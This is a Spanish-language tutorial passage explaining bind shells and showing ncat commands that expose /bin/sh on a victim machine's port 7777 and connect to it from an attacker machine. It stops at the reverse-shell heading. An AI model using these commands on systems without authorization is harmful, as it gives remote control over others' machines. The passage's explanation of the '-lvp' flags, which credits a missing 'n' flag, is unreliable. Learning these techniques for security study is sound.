Como crear un bind y reverse shell con ncat


Que es un bind shell


Un bind shell es un metodo que es utilizado por el atacante para obtener una shell(que seria como una especie de terminal)para poder ejecutar comandos de forma remota, basicamente para obtener control sobre una maquina.
El detalle de la bind shell es que nosotros por medio de un script o ejecutable debemos ejecutar un comando en la maquina victima, en el que se abra un puerto que al nosotros conectarnos obtenemos una shell y podemos ejecutar comandos. En el bind shell nosotros los atacantes nos conectamos a la maquina victima.
No es tan recomendable utilizar este metodo de la bind shell ya que la victima al ponerse a la escucha es posible que una persona que no sea nosotros se conecte, por lo cual es un metodo que solo se utiliza en ciertos casos.

Como crear un bind shell con ncat desde terminal linux?


Lo primero que haremos es abrir nuestro terminal obviamente y empezamos por instalar la herramienta ncat, para ello escribimos lo siguiente :

sudo apt -y install ncat

Despues de pegar esto en tu terminal te pedira tu contraseña, solamente debes escribirla y listo, esperas y tendras la herramienta instalada.

Ahora vamos a empezar con el bind shell, debemos escribir este comando en la maquina victima:

ncat -e /bin/sh -lvp 7777



Al hacer esto la maquina estara a la escucha esperando la conexion del atacante para darle la shell.
ncat : es el comando
-e : especifica el tipo de shell que se le dara al que se conecte
-lvp : la letra l significa listening, lo cual es que se pondra a la escucha la n es para que no se resuelvan los hostnames por via dns y la letra p es para especificar el numero del puerto, en este caso el 7777(tu puedes poner el puerto que desees).
Despues de esto estamos listos para conectarnos. Esto lo haremos desde el terminal de nuestra maquina atacante
Escribiremos el siguiente comando :

ncat 192.168.8.120 7777



Despues de dar enter ya nos habremos conectado a la maquina victima
La direccion ip puede variar dependiendo de como este estructurada tu red LAN y el puerto es el que elejiste anteriormente.



Se recibe la conexion en nuestra maquina victima, y adivinen que podemos hacer ahora desde nuestra maquina de atacante? SI ejecutar comandos remotos :D



La verdad es que es bastante sencillo y el reverse shell lo es aun mas.

Que es un reverse shell?


Un reverse shell es uno de los metodos mas utilizados para obtener una shell remota, y la diferencia que tiene con el bind shell es que nosotros no nos conectamos al servidor o la maquina victima, mas bien la maquina victima se conecta a nosotros otorgandonos acceso seguro.

Como crear un reverse shell?
